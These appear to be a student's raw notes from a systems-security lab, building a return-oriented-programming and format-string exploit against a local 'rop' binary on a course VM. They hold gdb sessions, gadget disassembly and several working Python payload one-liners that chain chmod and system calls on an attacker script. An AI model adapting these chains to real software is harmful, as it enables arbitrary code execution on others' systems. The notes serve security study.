the value of variable text
(gdb) info variables test
All variables matching regular expression "test":

Non-debugging symbols:
0x08049980  test


export FMT="%0256x%n%x"

(gdb) b main
Breakpoint 1 at 0x804853f

set $env = *((char **)environ)
set $shell = strdup("FMT")
while (0 != memcmp($env++, $shell, 3))
      >end  	
x/s $env-1

0xbfffffc4:	"FMT=%0256x%n%x"

fmt string address:
0xbfffffc4 + 4
(gdb) x/s 0xbfffffc8
0xbfffffc8:	"%0256x%n%x"


find a suitable epilogue

08048524 <cpybuf>:
 8048524:	55                   	push   %ebp
 8048525:	89 e5                	mov    %esp,%ebp
 8048527:	83 ec 14             	sub    $0x14,%esp
 804852a:	ff 75 08             	pushl  0x8(%ebp)
 804852d:	8d 45 ec             	lea    -0x14(%ebp),%eax
 8048530:	50                   	push   %eax
 8048531:	e8 7a fe ff ff       	call   80483b0 <strcpy@plt>
 8048536:	83 c4 08             	add    $0x8,%esp
 8048539:	90                   	nop
 804853a:	c9                   	leave  
 804853b:	c3                   	ret    


address printf: 0x8048536
address placehoder: 0x80484af 

printf args
0
test addresss: 0x08049980
0
fmt addresss: 0xbfffffc8

addresst test_print: 0x0804850b

address exit: 0xb7e24a60 

arg test_print: => address test: 0x08049980 


 8048693:	83 c4 08             	add    $0x8,%esp
 8048696:	5b                   	pop    %ebx
 8048697:	c3                   	ret
 

"`python2.7 -c 'from struct import pack; print("A"*24 + pack("I", 0x8048390) + pack("I", 0x8048678) + pack("I", 0xbfffffeb) + pack("I", 0x08049980) + pack("I", 0x08049980) + pack("I", 0x08049980) + pack("I", 0x0804850b) + pack("I", 0xb7e24a60) + pack("I", 0x08049980))'`"


syssec@syssecvm ~/rop % ./rop "`python2.7 -c 'from struct import pack; print("A"*24 + pack("I", 0x8048390) + pack("I", 0x8048678) + pack("I", 0xbfffffeb) + pack("I", 0x08049980) + pack("I", 0x08049980) + pack("I", 0x08049980) + pack("I", 0x0804850b) + pack("I", 0xb7e24a60) + pack("I", 0x08049980))'`"

Enter your help string:test

Your help string is test
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080499808049980
Value of test is 256
syssec@syssecvm ~/rop % pcalc 256
	256             	0x100             	0y100000000


8048678:	5b                   	pop    %ebx
8048679:	5e                   	pop    %esi
804867a:	5f                   	pop    %edi
804867b:	5d                   	pop    %ebp
804867c:	c3                   	ret    
 

"`python2.7 -c 'from struct import pack; print("A"*24 + pack("I", 0x8048390) + pack("I", 0x8048679) + pack("I", 0xbfffffeb) + pack("I", 0x08049980) + pack("I", 0x08049980) + pack("I", 0x0804850b) + pack("I", 0xb7e24a60) + pack("I", 0x08049980))'`"

export FMT="%0256x%n"

syssec@syssecvm ~/rop % ./rop "`python2.7 -c 'from struct import pack; print("A"*24 + pack("I", 0x8048390) + pack("I", 0x8048679) + pack("I", 0xbfffffeb) + pack("I", 0x08049980) + pack("I", 0x08049980) + pack("I", 0x0804850b) + pack("I", 0xb7e24a60) + pack("I", 0x08049980))'`"

Enter your help string:test

Your help string is test
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008049980804850b
Value of test is 256
syssec@syssecvm ~/rop % pcalc 256
	256             	0x100             	0y100000000

./rop "`python2.7 -c 'from struct import pack; print(pack("I", 0x1C0) + pack("I", 0x180))'`"

set $env = *((char **)environ)
set $shell = strdup("SCRIPT")
while (0 != memcmp($env++, $shell, 6))
      >end  	
x/s $env-1

Breakpoint 1, 0x08048439 in main ()
(gdb) x/s 0xbfffffe5
0xbfffffe5:	"home/syssec/rop/envadd"

set $env = *((char **)environ)
set $shell = strdup("SCRIPT")
while (0 != memcmp($env++, $shell, 6))
 >end
x/s $env-1
0xbfffffbb:	"SCRIPT=./somefile.sh"
(gdb) x/s 0xbffffff
0xbffffff:	<error: Cannot access memory at address 0xbffffff>
(gdb) x/s 0xbfffff1
0xbfffff1:	<error: Cannot access memory at address 0xbfffff1>
(gdb) x/s 0xbfffffa
0xbfffffa:	<error: Cannot access memory at address 0xbfffffa>
(gdb) x/s 0xbfffffbf
0xbfffffbf:	"PT=./somefile.sh"
(gdb) x/s 0xbfffffc2
0xbfffffc2:	"./somefile.sh"

chmod

0xb7eceba0 <+0>:	mov    edx,ebx
   0xb7eceba2 <+2>:	mov    ecx,DWORD PTR [esp+0x8]
   0xb7eceba6 <+6>:	mov    ebx,DWORD PTR [esp+0x4]
   0xb7ecebaa <+10>:	mov    eax,0xf
   0xb7ecebaf <+15>:	call   DWORD PTR gs:0x10
   0xb7ecebb6 <+22>:	mov    ebx,edx
   0xb7ecebb8 <+24>:	cmp    eax,0xfffff001
   0xb7ecebbd <+29>:	jae    0xb7ecebc0 <chmod+32>
   0xb7ecebbf <+31>:	ret    
   0xb7ecebc0 <+32>:	call   0xb7f18d6d <__x86.get_pc_thunk.cx>
   0xb7ecebc5 <+37>:	add    ecx,0xdd43b
   0xb7ecebcb <+43>:	mov    ecx,DWORD PTR [ecx-0xd4]
   0xb7ecebd1 <+49>:	neg    eax
   0xb7ecebd3 <+51>:	add    ecx,DWORD PTR gs:0x0
   0xb7ecebda <+58>:	mov    DWORD PTR [ecx],eax
   0xb7ecebdc <+60>:	or     eax,0xffffffff
   0xb7ecebdf <+63>:	ret    

system

0xb7e30ea0 <+0>:	sub    esp,0xc
   0xb7e30ea3 <+3>:	mov    eax,DWORD PTR [esp+0x10]
   0xb7e30ea7 <+7>:	call   0xb7f18d65 <__x86.get_pc_thunk.dx>
   0xb7e30eac <+12>:	add    edx,0x17b154
   0xb7e30eb2 <+18>:	test   eax,eax
   0xb7e30eb4 <+20>:	je     0xb7e30ec0 <system+32>
   0xb7e30eb6 <+22>:	add    esp,0xc
   0xb7e30eb9 <+25>:	jmp    0xb7e30940 <do_system>
   0xb7e30ebe <+30>:	xchg   ax,ax
   0xb7e30ec0 <+32>:	lea    eax,[edx-0x5757f]
   0xb7e30ec6 <+38>:	call   0xb7e30940 <do_system>
   0xb7e30ecb <+43>:	test   eax,eax
   0xb7e30ecd <+45>:	sete   al
   0xb7e30ed0 <+48>:	add    esp,0xc
   0xb7e30ed3 <+51>:	movzx  eax,al
   0xb7e30ed6 <+54>:	ret    

helpstr
Breakpoint 1, 0x0804853f in main ()
(gdb) info variables helpstr
All variables matching regular expression "helpstr":

Non-debugging symbols:
0x080499a8  helpstr

epilogue

0x8048685 <__libc_csu_init+85>  add    esp,0xc                             │
   │0x8048688 <__libc_csu_init+88>  pop    ebx                                 │
   │0x8048689 <__libc_csu_init+89>  pop    esi                                 │
   │0x804868a <__libc_csu_init+90>  pop    edi                                 │
   │0x804868b <__libc_csu_init+91>  pop    ebp                                 │
   │0x804868c <__libc_csu_init+92>  ret



./rop "`python2.7 -c 'from struct import pack; print("A"*24 + pack("I", 0xb7eceba0) + pack("I", 0x0804868a) + pack("I", 0xbfffffbd) + pack("I", 0x080499a8) + pack("I", 0xb7e30ea0) + pack("I", 0x0804868b) + pack("I", 0xbfffffbd) + pack("I", 0xb7eceba0) + pack("I", 0x0804868a) + pack("I", 0xbfffffbd) + pack("I", 0x080499ac) + pack("I", 0xb7e24a60))'`" <<< "`python2.7 -c 'from struct import pack; print(pack("I", 0x000001C0) + pack("I", 0x00000180))'`"
